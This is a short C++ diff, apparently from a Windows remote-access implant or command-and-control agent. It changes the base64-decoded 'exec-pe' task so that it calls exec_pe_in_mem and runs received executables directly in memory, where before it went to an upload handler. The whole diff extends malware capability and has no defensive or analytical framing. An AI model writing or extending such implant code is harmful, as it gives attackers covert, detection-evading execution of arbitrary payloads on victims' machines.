@@ -3,6 +3,7 @@
 #include "crypt.h"
 #include "file_utils.h"
 #include "config.h"
+#include "pe-exec.h"
 #include <cstdio>
 #include <windows.h>
 #include <string>
@@ -88,7 +89,7 @@ std::string parse_task(std::string b64_encoded_task) {
         return handle_upload(data);
     }
     else if (type == "exec-pe") {
-        return handle_upload(data);
+        return exec_pe_in_mem(data);
     }
     return "";
 }
